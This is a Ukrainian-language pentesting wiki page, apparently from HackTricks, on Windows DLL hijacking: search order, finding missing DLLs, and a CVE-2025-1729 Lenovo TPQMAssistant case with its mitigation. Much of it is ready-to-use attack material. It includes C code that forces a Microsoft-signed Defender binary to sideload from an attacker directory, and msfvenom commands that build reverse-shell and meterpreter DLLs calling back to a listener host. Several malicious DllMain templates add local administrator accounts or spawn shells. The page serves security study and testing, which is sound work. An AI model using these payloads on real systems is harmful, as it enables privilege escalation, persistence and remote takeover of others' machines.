# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає в маніпуляції довіреним додатком з метою змусити його завантажити шкідливий DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Його головне застосування — code execution, досягнення persistence і, рідше, privilege escalation. Незалежно від фокусу на escalation тут, методика hijacking залишається тією ж для різних цілей.

### Загальні техніки

Існує кілька методів для DLL hijacking, ефективність кожного залежить від стратегії завантаження DLL застосунком:

1. **DLL Replacement**: Замінити справжній DLL на шкідливий, опційно використовуючи DLL Proxying для збереження функціональності оригінального DLL.
2. **DLL Search Order Hijacking**: Розмістити шкідливий DLL у шляху пошуку, який перевіряється раніше за легітимний.
3. **Phantom DLL Hijacking**: Створити шкідливий DLL для додатку, який спробує завантажити його, думаючи, що це відсутній обов'язковий DLL.
4. **DLL Redirection**: Змінити параметри пошуку, як-от %PATH% або файли .exe.manifest / .exe.local, щоб спрямувати додаток до шкідливого DLL.
5. **WinSxS DLL Replacement**: Замінити легітимний DLL на шкідливий у каталозі WinSxS — метод, часто пов'язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розмістити шкідливий DLL у директорії під контролем користувача разом із скопійованим додатком, схоже на техніки Binary Proxy Execution.

## Finding missing Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) зі sysinternals і **налаштувати** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

а потім показати тільки **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **missing dlls in general**, залиште це працювати кілька **seconds**.\
Якщо ви шукаєте **missing dll** всередині конкретного виконуваного файлу, потрібно додати **ще один фільтр, наприклад "Process Name" "contains" "\<exec name>", виконати його і зупинити захоплення подій**.

## Exploiting Missing Dlls

Щоб ескалювати privileges, найкращий шанс — мати можливість **записати dll, який привілейований процес спробує завантажити** у одне із місць, де він буде шукатися. Таким чином ми зможемо **записати** dll у **каталог**, де цей dll шукатиметься **раніше**, ніж каталог з **оригінальним dll** (нетиповий випадок), або записати його у каталог, де dll просто відсутній у будь-якому іншому місці.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Додатки Windows шукають DLL, слідуючи набору попередньо визначених шляхів пошуку у певній послідовності. Проблема DLL hijacking виникає, коли шкідливий DLL стратегічно розміщено в одному з цих каталогів так, щоб він завантажився раніше за автентичний DLL. Рішенням для запобігання цьому є забезпечення того, щоб додаток використовував абсолютні шляхи при зверненні до потрібних DLL.

Нижче наведено **DLL search order on 32-bit** системах:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **default** порядок пошуку при увімкненому **SafeDllSearchMode**. Якщо він вимкнений, поточний каталог піднімається на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з прапором **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який завантажує **LoadLibraryEx**.

Нарешті, зауважте, що **dll може бути вказаний абсолютним шляхом замість просто імені**. У такому випадку цей dll буде шукатися **тільки за цим шляхом** (якщо dll має залежності, вони будуть шукатися як просто завантажені за іменем).

Існують інші способи змінити порядок пошуку, але тут я їх описувати не буду.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміністично вплинути на шлях пошуку DLL для щойно створеного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS при створенні процесу через нативні API ntdll. Підставивши сюди контрольований зловмисником каталог, цільовий процес, який резолвить імпортований DLL за ім'ям (без абсолютного шляху і без використання безпечних прапорів завантаження), можна примусити завантажити шкідливий DLL з цього каталогу.

Ключова ідея
- Побудувати параметри процесу за допомогою RtlCreateProcessParametersEx і вказати кастомний DllPath, що вказує на вашу контрольовану папку (наприклад, директорію, де знаходиться ваш dropper/unpacker).
- Створити процес за допомогою RtlCreateUserProcess. Коли цільовий бінар резолвитиме DLL за ім'ям, завантажувач проконсультується з наданим DllPath під час резолюції, що дозволить надійно виконати sideloading, навіть якщо шкідливий DLL не знаходиться поруч із цільовим EXE.

Примітки/обмеження
- Це впливає лише на дочірній процес, що створюється; це відрізняється від SetDllDirectory, який впливає тільки на поточний процес.
- Ціль має імпортувати або викликати LoadLibrary по імені (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs та жорстко закодовані абсолютні шляхи не можна перехитрити. Forwarded exports і SxS можуть змінити пріоритет.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Практичний приклад використання
- Помістіть шкідливий xmllite.dll (який експортує необхідні функції або перенаправляє виклики до справжнього) у ваш каталог DllPath.
- Запустіть signed binary, відомий тим, що шукає xmllite.dll за назвою, використовуючи вищевказану техніку. Loader вирішує імпорт через вказаний DllPath і sideloads ваш DLL.

Ця техніка була зафіксована in-the-wild як механізм для багатоступеневих sideloading-ланцюжків: початковий лаунчер скидає helper DLL, який потім породжує Microsoft-signed, hijackable binary з кастомним DllPath, щоб примусово завантажити attacker’s DLL зі staging directory.


#### Exceptions on dll search order from Windows docs

У документації Windows зазначено певні винятки зі стандартного порядку пошуку DLL:

- Коли зустрічається **DLL, що має ту саму назву, що й вже завантажена в пам'ять**, система обминає звичайний пошук. Натомість вона виконує перевірку на перенаправлення та наявність manifest перед тим, як повернутися до DLL, яка вже знаходиться в пам'яті. **У цьому сценарії система не проводить пошук DLL**.
- У випадках, коли DLL розпізнано як **known DLL** для поточної версії Windows, система використовуватиме свою версію цієї known DLL, разом з будь-якими її залежними DLL, **уникнувши процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL проводиться так, ніби вони були вказані лише своїми **module names**, незалежно від того, чи початкова DLL була ідентифікована через повний шлях.

### Ескалація привілеїв

**Вимоги**:

- Виявити процес, який працює або буде працювати з **іншими привілеями** (horizontal або lateral movement), і який **не має DLL**.
- Забезпечити наявність **write access** до будь-якого **каталогу**, у якому **DLL** буде **шукатися**. Цим місцем може бути каталог виконуваного файлу або каталог у системному шляху.

Так, вимоги складно знайти, оскільки **за замовчуванням доволі дивно знайти привілейований виконуваний файл без DLL**, і ще **більш дивно мати права запису в папку в системному шляху** (за замовчуванням цього не можна). Але в неправильно сконфігурованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте вимогам, можете подивитися проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **головна мета проекту — обхід UAC**, там можна знайти **PoC** Dll hijaking для версії Windows, який ви можете використати (ймовірно, лише змінивши шлях до папки, де у вас є права запису).

Зверніть увагу, що ви можете **перевірити свої права в папці**, зробивши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити imports у executable та exports у dll за допомогою:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного посібника про те, як **abuse Dll Hijacking to escalate privileges** з правами на запис у **System Path folder** перегляньте:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права запису в будь-яку папку всередині system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Example

У разі, якщо ви знайдете експлуатований сценарій, одним із найважливіших аспектів для успішної експлуатації буде **створити dll, який експортує принаймні всі функції, які виконуваний файл імпортуватиме з нього**. Також зауважте, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні dll hijacking, спрямованому на виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете деякі **basic dll codes**, які можуть бути корисні як **templates** або для створення **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **execute your malicious code when loaded**, але також **expose** і **work** as **expected** шляхом переадресування всіх викликів до реальної бібліотеки.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **indicate an executable and select the library** яку хочете proxify та **generate a proxified dll**, або **indicate the Dll** і **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив версії x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в деяких випадках Dll, яку ви компілюєте, має **export several functions**, які будуть завантажені victim process; якщо ці функції не існують, **binary won't be able to load** їх і **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Кейс: CVE-2025-1729 — Privilege Escalation за допомогою TPQMAssistant.exe

У цьому кейсі демонструється **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), відстежується як **CVE-2025-1729**.

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом увійшовшого користувача.
- **Дозволи каталогу**: має права запису для `CREATOR OWNER`, що дозволяє локальним користувачам залишати довільні файли.
- **DLL Search Behavior**: спочатку намагається завантажити `hostfxr.dll` з робочого каталогу й виводить у журнал "NAME NOT FOUND", якщо його не знайдено, що свідчить про пріоритет пошуку в локальному каталозі.

### Exploit Implementation

Зловмисник може розмістити шкідливий `hostfxr.dll` stub у тому ж каталозі, використавши відсутність DLL для виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Послідовність атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Зачекайте, поки заплановане завдання виконається о 9:30 ранку в контексті поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання завдання, шкідлива DLL запускається в сесії адміністратора з medium integrity.
4. Застосуйте стандартні UAC bypass techniques, щоб підвищити привілеї з medium integrity до SYSTEM.

### Міри пом'якшення

Lenovo випустила UWP версію **1.12.54.0** через Microsoft Store, яка встановлює TPQMAssistant у `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, видаляє вразливе заплановане завдання та деінсталює застарілі Win32-компоненти.

## Посилання

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
